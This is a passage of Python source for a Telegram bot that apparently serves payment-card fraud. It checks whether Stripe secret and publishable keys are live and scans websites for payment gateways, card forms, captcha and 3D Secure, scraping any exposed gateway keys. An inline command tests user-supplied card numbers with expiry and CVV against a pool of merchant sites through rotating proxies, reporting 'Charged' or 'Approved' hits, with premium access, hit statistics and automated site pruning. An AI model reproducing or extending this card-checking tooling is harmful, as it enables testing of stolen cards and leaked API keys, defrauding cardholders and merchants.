        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/sk &lt;Stripe_Key&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/sk pk_live_xxxxxxxxxxxxxxxxxxxx</code>
<code>/sk pk_test_xxxxxxxxxxxxxxxxxxxx</code>
<code>/sk sk_live_xxxxxxxxxxxxxxxxxxxx</code>"""), parse_mode='html')
        return

    key = parts[1].strip()

    if not key.startswith(('pk_live_', 'pk_test_', 'sk_live_', 'sk_test_')):
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ Sᴛʀɪᴘᴇ Kᴇʏ!\n\nMᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ:\n<code>pk_live_</code>, <code>pk_test_</code>, <code>sk_live_</code>, ᴏʀ <code>sk_test_</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ Sᴛʀɪᴘᴇ Kᴇʏ..."), parse_mode='html')

    try:
        t0 = time.time()

        if key.startswith(('sk_live_', 'sk_test_')):
            key_type = "SECRET LIVE " if key.startswith(
                'sk_live_') else "SECRET TEST "
        else:
            key_type = "LIVE " if key.startswith('pk_live_') else "TEST "

        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36"
        }
        data = {"key": key}

        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data) as resp:
                status_code = resp.status
                elapsed_ms = round((time.time() - t0) * 1000)

                try:
                    body = await resp.json()
                except:
                    body = {}

                error_msg = body.get('error', {}).get(
                    'message', '') if isinstance(body, dict) else ''

                if resp.status == 200:
                    status_icon = "✅"
                    status_label = "VALID"
                    details = f"""  • Kᴇʏ ɪs ᴀᴄᴄᴇᴘᴛᴇᴅ ʙʏ Sᴛʀɪᴘᴇ API
  • Cᴀɴ ʙᴇ ᴜsᴇᴅ ғᴏʀ ᴛᴏᴋᴇɴ ᴄʀᴇᴀᴛɪᴏɴ
  • Rᴇᴀᴅʏ ғᴏʀ ᴄʜᴇᴄᴋᴏᴜᴛ ɪɴᴛᴇɢʀᴀᴛɪᴏɴ"""

                elif resp.status == 401:
                    error_lower = error_msg.lower()
                    if "invalid api key" in error_lower:
                        status_icon = "❌"
                        status_label = "INVALID"
                        details = f"  • Rᴇᴀsᴏɴ: Iɴᴠᴀʟɪᴅ API Kᴇʏ"
                    elif "platform" in error_lower or "account" in error_lower:
                        status_icon = "⚠️"
                        status_label = "VALID (Aᴄᴄᴏᴜɴᴛ Mɪsᴍᴀᴛᴄʜ)"
                        details = f"""  • Kᴇʏ ғᴏʀᴍᴀᴛ ɪs ᴄᴏʀʀᴇᴄᴛ
  • Nᴇᴇᴅs <code>_stripe_account</code> ʜᴇᴀᴅᴇʀ
  • Eʀʀᴏʀ: {error_msg[:80]}"""
                    else:
                        status_icon = "❌"
                        status_label = "AUTH ERROR"
                        details = f"  • Rᴇᴀsᴏɴ: {error_msg[:80] or 'Aᴜᴛʜ ᴇʀʀᴏʀ'}"
                elif resp.status == 429:
                    status_icon = "⚠️"
                    status_label = "RATE LIMITED"
                    details = f"  • Rᴇᴀsᴏɴ: Tᴏᴏ ᴍᴀɴʏ ʀᴇǫᴜᴇsᴛs (429)"
                else:
                    status_icon = "❌"
                    status_label = "UNKNOWN"
                    details = f"  • Rᴇᴀsᴏɴ: Uɴᴇxᴘᴇᴄᴛᴇᴅ sᴛᴀᴛᴜs {resp.status}"

        result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
    SK Cʜᴇᴄᴋᴇʀ
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
  {status_icon} <b>{status_label}</b>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼

🔑 Kᴇʏ: <code>{key}</code>
📋 Tʏᴘᴇ: <b>{key_type}</b>

📡 API: <code>{status_code}</code>
⏱️ Tɪᴍᴇ: <code>{elapsed_ms}ms</code>

{details}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 @OwnerGhostHex"""

        await safe_edit(status_msg, premium_emoji(result), parse_mode='html')

    except asyncio.TimeoutError:
        await safe_edit(status_msg, premium_emoji("❌ Rᴇǫᴜᴇsᴛ ᴛɪᴍᴇᴅ ᴏᴜᴛ (15s)"), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/scg'))
async def site_check(event):
    user_id = event.sender_id

    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/scg &lt;URL&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/scg https://example.com</code>
<code>/scg example.com</code>"""), parse_mode='html')
        return

    url = parts[1].strip()
    if not url.startswith('http'):
        url = f'https://{url}'

    status_msg = await event.reply(premium_emoji(f"🔍 Sᴄᴀɴɴɪɴɢ <code>{url}</code>..."), parse_mode='html')

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Upgrade-Insecure-Requests": "1",
            "DNT": "1",
            "Connection": "keep-alive"
        }

        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, headers=headers, ssl=False, allow_redirects=True) as resp:
                html = await resp.text()
                final_url = str(resp.url)

        site_display = final_url.replace('https://', '').replace('http://', '')

        gateways = detect_gateways(html)
        cms_list = detect_cms(html)
        captcha = detect_captcha(html) or "None"
        cloudflare = detect_cloudflare(None, html) or "None"
        cdn = detect_cdn(html, None) or "N/A"
        sec_3d = detect_3d_secure(html)
        graphql = detect_graphql(html)
        has_card = has_card_form(html)

        keys = extract_gateway_keys(html)
        keys_str = ""
        if keys:
            parts_list = []
            for provider, klist in keys.items():
                if klist:
                    parts_list.append(
                        f"{provider}: <code>{klist[0][:30]}</code>")
            if parts_list:
                keys_str = "\n".join(parts_list)

        analytics_list = detect_analytics(html, _scripts(html))
        analytics_str = ", ".join(analytics_list) if analytics_list else "None"

        status_code = resp.status

        result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
    Sɪᴛᴇ Cʜᴇᴄᴋᴇʀ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🌐 <b>URL:</b> <code>{site_display}</code>
📡 <b>Sᴛᴀᴛᴜs:</b> <code>{status_code}</code>
🔌 <b>Gᴀᴛᴇᴡᴀʏs:</b> {', '.join(gateways) if gateways else '❌ Nᴏɴᴇ'}
💡️ <b>CMS:</b> {', '.join(cms_list) if cms_list else 'Unknown'}
💳 <b>Cᴀʀᴅ Fᴏʀᴍ:</b> {'✅ Yᴇs' if has_card else '❌ Nᴏ'}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🔑 <b>Keys:</b>
{keys_str if keys_str else '  ❌ Nᴏɴᴇ ғᴏᴜɴᴅ'}
💡️ <b>Sᴇʀᴠᴇʀ:</b> <code>{resp.headers.get('Server', 'N/A')}</code>
💡️ <b>CDN:</b> {cdn}
🛡️ <b>Cʟᴏᴜᴅғʟᴀʀᴇ:</b> {cloudflare}
💡 <b>Cᴀᴘᴛᴄʜᴀ:</b> {captcha}
🔐 <b>3D Sᴇᴄᴜʀᴇ:</b> {sec_3d}
📊 <b>GʀᴀᴘʜQL:</b> {graphql}
📈 <b>Aɴᴀʟʏᴛɪᴄs:</b> {analytics_str}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""

        await safe_edit(status_msg, premium_emoji(result), parse_mode='html')

    except asyncio.TimeoutError:
        await safe_edit(status_msg, premium_emoji(f"❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ sᴄᴀɴɴɪɴɢ <code>{url}</code>"), parse_mode='html')
    except aiohttp.ClientConnectorError:
        await safe_edit(status_msg, premium_emoji(f"❌ Cᴀɴ'ᴛ ᴄᴏɴɴᴇᴄᴛ ᴛᴏ <code>{url}</code>"), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/fake'))
async def fake_data(event):
    user_id = event.sender_id

    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/fake &lt;ᴄᴏᴜɴᴛʀʏ_ᴄᴏᴅᴇ&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/fake us</code>
<code>/fake eg</code>
<code>/fake fr</code>
<code>/fake gb</code>
<code>/fake sa</code>
"""), parse_mode='html')
        return

    country_code = parts[1].strip().lower()

    # randomuser.me supported nationalities
    randomuser_nat = {
        'us': 'us', 'gb': 'gb', 'au': 'au', 'br': 'br', 'ca': 'ca',
        'ch': 'ch', 'de': 'de', 'dk': 'dk', 'es': 'es', 'fi': 'fi',
        'fr': 'fr', 'ie': 'ie', 'in': 'in', 'ir': 'ir', 'mx': 'mx',
        'nl': 'nl', 'no': 'no', 'nz': 'nz', 'rs': 'rs', 'tr': 'tr',
        'ua': 'ua',
    }

    status_msg = await event.reply(premium_emoji(f"🔄 Gᴇɴᴇʀᴀᴛɪɴɢ ғᴀᴋᴇ ᴅᴀᴛᴀ ғᴏʀ <code>{country_code}</code>..."), parse_mode='html')

    try:
        timeout = aiohttp.ClientTimeout(total=15)
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            nat_param = randomuser_nat.get(country_code, 'us')
            async with session.get(f"https://randomuser.me/api/?nat={nat_param}") as resp:
                if resp.status != 200:
                    await safe_edit(status_msg, premium_emoji(f"❌ API Eʀʀᴏʀ: {resp.status}"), parse_mode='html')
                    return

                data = await resp.json()

                if not data or not data.get('results'):
                    await safe_edit(status_msg, premium_emoji(f"❌ Nᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ғᴏʀ <code>{country_code}</code>"), parse_mode='html')
                    return

                person = data['results'][0]
                name = f"{person['name']['first']} {person['name']['last']}"
                gender = person.get('gender', 'N/A').capitalize()
                loc = person.get('location', {})
                street = loc.get('street', {})
                address = f"{street.get('number', '')} {street.get('name', '')}, {loc.get('city', '')}, {loc.get('state', '')} {loc.get('postcode', '')}"
                country_name_api = loc.get('country', country_code.upper())
                latitude = loc.get('coordinates', {}).get('latitude', 'N/A')
                longitude = loc.get('coordinates', {}).get('longitude', 'N/A')
                email = person.get('email', 'N/A')
                phone_h = person.get('phone', 'N/A')
                phone_w = person.get('cell', 'N/A')
                login = person.get('login', {})
                username = login.get('username', 'N/A')
                password = login.get('password', 'N/A')
                dob = person.get('dob', {})
                birth_data = dob.get('date', 'N/A')[:10] if dob.get('date') else 'N/A'
                age = dob.get('age', 'N/A')
                id_info = person.get('id', {})
                id_name = id_info.get('name', 'N/A')
                id_value = id_info.get('value', 'N/A')

                country_code_upper = country_code.upper()
                flag = get_flag(country_code_upper)

                result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
     Fᴀᴋᴇ Dᴀᴛᴀ Gᴇɴᴇʀᴀᴛᴏʀ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>Nᴀᴍᴇ</b> ↯ <code>{name}</code>
💡 <b>Gᴇɴᴅᴇʀ</b> ↯ <code>{gender}</code>

💡 <b>Eᴍᴀɪʟ</b> ↯ <code>{email}</code>
💡 <b>Pʜᴏɴᴇ</b> ↯ <code>{phone_h}</code>
💡 <b>Cᴇʟʟ</b> ↯ <code>{phone_w}</code>

💡 <b>Aᴅᴅʀᴇss</b> ↯ <code>{address}</code>
💡 <b>Cᴏᴜɴᴛʀʏ</b> ↯ <code>{country_name_api}</code> {flag}
💡 <b>Cᴏᴏʀᴅɪɴᴀᴛᴇs</b> ↯ <code>{latitude}, {longitude}</code>

💡 <b>Usᴇʀɴᴀᴍᴇ</b> ↯ <code>{username}</code>
💡 <b>Pᴀssᴡᴏʀᴅ</b> ↯ <code>{password}</code>

💡 <b>ID</b> ↯ <code>{id_name}: {id_value}</code>
💡 <b>Bɪʀᴛʜ Dᴀᴛᴇ</b> ↯ <code>{birth_data}</code>
💡 <b>Aɢᴇ</b> ↯ <code>{age}</code>

∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼"""

                await safe_edit(status_msg, premium_emoji(result), parse_mode='html')

    except asyncio.TimeoutError:
        await safe_edit(status_msg, premium_emoji(f"❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ ɢᴇɴᴇʀᴀᴛɪɴɢ ᴅᴀᴛᴀ ғᴏʀ <code>{country_code}</code>"), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/ip'))
async def ip_lookup(event):
    user_id = event.sender_id

    data = event.raw_text[4:].strip()

    if not data:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/ip &lt;IP_Address&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/ip 192.168.1.1</code>
<code>/ip 8.8.8.8</code>
"""), parse_mode='html')
        return

    ip_pattern = r'((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
    ip_match = re.search(ip_pattern, data)

    if not ip_match:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ IP Aᴅᴅʀᴇss!"), parse_mode='html')
        return

    ip_address = ip_match.group(0)

    status_msg = await event.reply(premium_emoji(f"🔄 Lᴏᴏᴋɪɴɢ ᴜᴘ <code>{ip_address}</code>..."), parse_mode='html')

    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://ipinfo.io/{ip_address}/json") as resp:
                if resp.status != 200:
                    await safe_edit(status_msg, premium_emoji(f"❌ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴏᴋ ᴜᴘ <code>{ip_address}</code>"), parse_mode='html')
                    return

                data = await resp.json()

                if not data or 'ip' not in data:
                    await safe_edit(status_msg, premium_emoji(f"❌ IP Dᴀᴛᴀ ᴡᴀsɴ'ᴛ Fᴏᴜɴᴅ!"), parse_mode='html')
                    return

                ip = data.get('ip', 'N/A')
                hostname = data.get('hostname', 'N/A')
                city = data.get('city', 'N/A')
                region = data.get('region', 'N/A')
                country_code = data.get('country', 'N/A')
                loc = data.get('loc', 'N/A')
                org = data.get('org', 'N/A')
                postal = data.get('postal', 'N/A')
                timezone = data.get('timezone', 'N/A')
                anycast = data.get('anycast', False)

                loc_parts = loc.split(',') if loc != 'N/A' else ['N/A', 'N/A']
                lat = loc_parts[0] if len(loc_parts) > 0 else 'N/A'
                lon = loc_parts[1] if len(loc_parts) > 1 else 'N/A'

                country_name = country_code
                try:
                    async with session.get(f"https://restcountries.com/v3.1/alpha/{country_code}") as resp2:
                        if resp2.status == 200:
                            country_data = await resp2.json()
                            country_name = country_data[0].get(
                                'name', {}).get('common', country_code)
                except:
                    pass

                asn = org.split(
                    ' ')[0] if org != 'N/A' and org.startswith('AS') else org

                flag = get_flag(country_code)

                result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
     IP Lᴏᴏᴋᴜᴘ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>IP</b> ↯ <code>{ip}</code>
💡 <b>Hᴏsᴛɴᴀᴍᴇ</b> ↯ <code>{hostname}</code>
💡 <b>ASN</b> ↯ <code>{asn}</code>
💡 <b>Oʀɢᴀɴɪᴢᴀᴛɪᴏɴ</b> ↯ <code>{org}</code>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>Cɪᴛʏ</b> ↯ <code>{city}</code>
💡 <b>Sᴛᴀᴛᴇ</b> ↯ <code>{region}</code>
💡 <b>Pᴏsᴛᴀʟ Cᴏᴅᴇ</b> ↯ <code>{postal}</code>
💡 <b>Cᴏᴜɴᴛʀʏ</b> ↯ <code>{country_name}</code> {flag}
📍 <b>Cᴏᴏʀᴅɪɴᴀᴛᴇs</b> ↯ <code>{lat}, {lon}</code>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
⏱️ <b>Tɪᴍᴇᴢᴏɴᴇ</b> ↯ <code>{timezone}</code>
🔄 <b>Aɴʏᴄᴀsᴛ</b> ↯ {'✅ Yᴇs' if anycast else '❌ Nᴏ'}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""

                await safe_edit(status_msg, premium_emoji(result), parse_mode='html')

    except asyncio.TimeoutError:
        await safe_edit(status_msg, premium_emoji(f"❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ ʟᴏᴏᴋɪɴɢ ᴜᴘ <code>{ip_address}</code>"), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/iban'))
async def iban_lookup(event):
    user_id = event.sender_id

    data = event.raw_text[6:].strip()

    if not data:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/iban &lt;IBAN&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/iban GB82WEST12345698765432</code>
<code>/iban DE89370400440532013000</code>
"""), parse_mode='html')
        return

    iban_pattern = r'([A-Z]{2}[ ]?[0-9]{2})(?=(?:[ ]?[A-Z0-9]){9,30}$)((?:[ ]?[A-Z0-9]{3,5}){2,7})([ ]?[A-Z0-9]{1,3})?'
    iban_match = re.search(iban_pattern, data)

    if not iban_match:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ IBAN!"), parse_mode='html')
        return

    iban = iban_match.group(0).replace(' ', '')

    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{iban}</code>..."), parse_mode='html')

    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://openiban.com/validate/{iban}?getBIC=true&validateBankCode=true") as resp:
                if resp.status != 200:
                    await safe_edit(status_msg, premium_emoji("❌ Gᴇɴᴇʀᴀʟ Sᴇʀᴠᴇʀ Eʀʀᴏʀ!"), parse_mode='html')
                    return

                data = await resp.json()

                if not data.get('valid'):
                    messages = data.get('messages', [])
                    error_msg = ', '.join(
                        messages) if messages else "Tʜɪs IBAN ɪsɴ'ᴛ Vᴀʟɪᴅ"
                    await safe_edit(status_msg, premium_emoji(f"❌ {error_msg}!"), parse_mode='html')
                    return

                bank_data = data.get('bankData', {})

                bank_name = bank_data.get('name', 'N/A')
                bank_code = bank_data.get('bankCode', 'N/A')
                bic = bank_data.get('bic', 'N/A')
                messages = ', '.join(data.get('messages', ['Valid IBAN']))

                result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
    IBAN Lᴏᴏᴋᴜᴘ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>IBAN</b> ↯ <code>{iban}</code>
💡 <b>Mᴇssᴀɢᴇs</b> ↯ <i>{messages}</i>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🏦 <b>Bᴀɴᴋ</b> ↯ <i>{bank_name}</i>
🔢 <b>Bᴀɴᴋ Cᴏᴅᴇ</b> ↯ <i>{bank_code}</i>
🔑 <b>BIC</b> ↯ <i>{bic}</i>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼"""

                await safe_edit(status_msg, premium_emoji(result), parse_mode='html')

    except asyncio.TimeoutError:
        await safe_edit(status_msg, premium_emoji("❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ ᴄʜᴇᴄᴋɪɴɢ IBAN"), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(" Sᴛᴏᴘᴘᴇᴅ", alert=True)
        await safe_edit(event, premium_emoji("🛑 Cʜᴇᴄᴋɪɴɢ sᴛᴏᴘᴘᴇᴅ ʙʏ ᴜsᴇʀ."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def bot_stats_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    status_msg = await event.reply(premium_emoji("🔄 Fᴇᴛᴄʜɪɴɢ sᴛᴀᴛs..."), parse_mode='html')
    try:
        db_stats = await db_manager.get_bot_stats()
        proxies = await load_proxies()
        sites = await load_sites()
        total_hits = db_stats['total_charged'] + db_stats['total_approved']
        
        stats_text = f"""📊 <b>Bᴏᴛ Gʟᴏʙᴀʟ Sᴛᴀᴛɪsᴛɪᴄs</b>

👥 <b>Usᴇʀs</b>
  ┣ Tᴏᴛᴀʟ: <code>{db_stats['total_users']}</code>
  ┗ Pʀᴇᴍɪᴜᴍ: <code>{db_stats['premium_users']}</code>

🔑 <b>Kᴇʏs</b>
  ┗ Tᴏᴛᴀʟ Gᴇɴᴇʀᴀᴛᴇᴅ: <code>{db_stats['total_keys']}</code>

📈 <b>Cʜᴇᴄᴋ Hɪsᴛᴏʀʏ</b>
  ┣ Tᴏᴛᴀʟ Sᴇssɪᴏɴs: <code>{db_stats['total_checks']}</code>
  ┣ 💎 Cʜᴀʀɢᴇᴅ: <code>{db_stats['total_charged']}</code>
  ┣ ✅ Aᴘᴘʀᴏᴠᴇᴅ: <code>{db_stats['total_approved']}</code>
  ┗ 🔥 Tᴏᴛᴀʟ Hɪᴛs: <code>{total_hits}</code>

📂 <b>Dᴀᴛᴀ Cᴀᴄʜᴇ</b>
  ┗ BINs Cᴀᴄʜᴇᴅ: <code>{db_stats['total_bins']}</code>

🌐 <b>Nᴇᴛᴡᴏʀᴋ Hᴇᴀʟᴛʜ</b>
  ┣ Aʟɪᴠᴇ Pʀᴏxɪᴇs: <code>{len(proxies)}</code>
  ┗ Aᴄᴛɪᴠᴇ Sɪᴛᴇs: <code>{len(sites)}</code>"""
  
        await safe_edit(status_msg, premium_emoji(stats_text), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.InlineQuery)
async def inline_cc_handler(event):
    user_id = event.sender_id
    if not await is_premium(user_id):
        await event.answer([
            event.builder.article(
                title="❌ Access Denied",
                text="Only premium users can use inline CC check."
            )
        ])
        return
    query = event.text.strip()
    if not query or '|' not in query:
        await event.answer([
            event.builder.article(
                title="📝 Usage: card|mm|yy|cvv",
                text="Type a card in format: 4242424242424242|12|28|123"
            )
        ])
        return
    cards = extract_cc(query)
    if not cards:
        await event.answer([
            event.builder.article(
                title="❌ Invalid card format",
                text="Use: 4242424242424242|12|28|123"
            )
        ])
        return
    card = cards[0]
    try:
        sites = await load_sites()
        proxies = await load_proxies()
        if not sites or not proxies:
            await event.answer([
                event.builder.article(
                    title="❌ No sites/proxies available",
                    text="Contact admin."
                )
            ])
            return
        result = await check_card_with_retry(card, sites, proxies, max_retries=2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_icon = "💎"
        elif result['status'] == 'Approved':
            status_icon = "✅"
        else:
            status_icon = "❌"
        result_text = f"""{status_icon} {result['status']}

💳 Card: {card}
🛒 Gateway: {result.get('gateway', 'Unknown')}
📝 Response: {result['message'][:100]}
💸 Price: {result.get('price', '-')}
🆔 BIN: {brand} - {bin_type} - {level}
🏦 Bank: {bank}
🌍 Country: {country} {flag}

💡 @OwnerGhostHex"""
        await event.answer([
            event.builder.article(
                title=f"{status_icon} {result['status']} | {card[:10]}...",
                description=f"{result.get('gateway', 'Unknown')} | {result['message'][:50]}",
                text=result_text
            )
        ])
    except Exception as e:
        await event.answer([
            event.builder.article(
                title=f"❌ Error",
                text=f"Error: {str(e)[:100]}"
            )
        ])


async def auto_backup():
    await asyncio.sleep(random.randint(600, 3600))
    files_to_backup = ["bot.db", SITES_FILE, PROXY_FILE]
    while True:
        try:
            zip_filename = f"DB_Backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in files_to_backup:
                    if os.path.exists(file):
                        zipf.write(file)
            await bot.send_file(ADMIN_ID[0], zip_filename, caption=f"📦 **Aᴜᴛᴏᴍᴀᴛᴇᴅ DB Bᴀᴄᴋᴜᴘ**\n⏰ Tɪᴍᴇ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            if os.path.exists(zip_filename):
                os.remove(zip_filename)
        except Exception as e:
            print(f"Backup Error: {e}")
        await asyncio.sleep(6 * 60 * 60)


async def auto_expire_premiums():
    """Runs every 30 minutes. Revokes expired premium users and notifies admin."""
    await asyncio.sleep(30)
    while True:
        try:
            revoked = await db_manager.revoke_expired_premiums()
            if revoked:
                ids_text = ", ".join([str(uid) for uid in revoked[:20]])
                await safe_send(ADMIN_ID[0], premium_emoji(f"⏰ <b>Aᴜᴛᴏ-Exᴘɪʀᴇᴅ {len(revoked)} ᴜsᴇʀs</b>\n\n🆔 IDs: <code>{ids_text}</code>"), parse_mode='html')
        except Exception as e:
            print(f"Auto-expire error: {e}")
        await asyncio.sleep(30 * 60)


async def admin_health_alerts():
    """Runs every 15 minutes. Alerts admin if proxies or sites are critically low."""
    await asyncio.sleep(60)
    while True:
        try:
            proxies = await load_proxies()
            sites = await load_sites()
            alerts = []
            if len(proxies) < 15:
                alerts.append(f"🔴 Pʀᴏxɪᴇs ᴄʀɪᴛɪᴄᴀʟʟʏ ʟᴏᴡ: <code>{len(proxies)}</code>")
            if len(sites) < 5:
                alerts.append(f"🔴 Sɪᴛᴇs ᴄʀɪᴛɪᴄᴀʟʟʏ ʟᴏᴡ: <code>{len(sites)}</code>")
            if alerts:
                alert_text = "🚨 <b>Hᴇᴀʟᴛʜ Aʟᴇʀᴛ</b>\n\n" + "\n".join(alerts)
                await safe_send(ADMIN_ID[0], premium_emoji(alert_text), parse_mode='html')
        except Exception as e:
            print(f"Health alert error: {e}")
        await asyncio.sleep(15 * 60)


async def auto_clean_sites():
    """Runs every 12 hours. Only removes sites that are genuinely DEAD_SITE (domain gone). Throttled/timeout sites are kept."""
    await asyncio.sleep(600)  # Wait 10 minutes after boot
    while True:
        try:
            sites = await load_sites()
            proxies = await load_proxies()
            if not sites or not proxies or len(proxies) < 5:
                await asyncio.sleep(12 * 60 * 60)
                continue
            alive_sites = []
            dead_sites = []
            for site in sites:
                is_dead_confirmed = False
                dead_count = 0
                for attempt in range(3):
                    try:
                        proxy = random.choice(proxies)
                        res = await test_site_with_price(site, proxy)
                        if res['status'] == 'alive':
                            break  # One alive response is enough
                        else:
                            dead_count += 1
                    except:
                        pass
                    await asyncio.sleep(3)  # Slower to avoid throttling
                # Only mark dead if ALL 3 attempts returned genuinely dead
                if dead_count >= 3:
                    is_dead_confirmed = True
                if is_dead_confirmed:
                    dead_sites.append(site)
                else:
                    alive_sites.append(site)
                # Pace the checks to not overwhelm proxies
                await asyncio.sleep(0.5)
            if dead_sites:
                current_sites = await load_sites()
                new_alive_sites = [s for s in current_sites if s not in dead_sites]
                async with aiofiles.open(SITES_FILE, 'w') as f:
                    for site in new_alive_sites:
                        await f.write(f"{site}\n")
                current_db_sites = await load_sites_with_price()
                if current_db_sites:
                    new_db_sites = [s for s in current_db_sites if s['url'] not in dead_sites]
                    await save_sites_with_price(new_db_sites)
                await safe_send(ADMIN_ID[0], premium_emoji(f"🧹 <b>Aᴜᴛᴏ Sɪᴛᴇ Cʟᴇᴀɴᴜᴘ</b>\n\n✅ Aʟɪᴠᴇ: <code>{len(new_alive_sites)}</code>\n❌ Rᴇᴍᴏᴠᴇᴅ (ᴄᴏɴꜰɪʀᴍᴇᴅ ᴅᴇᴀᴅ): <code>{len(dead_sites)}</code>"), parse_mode='html')
            else:
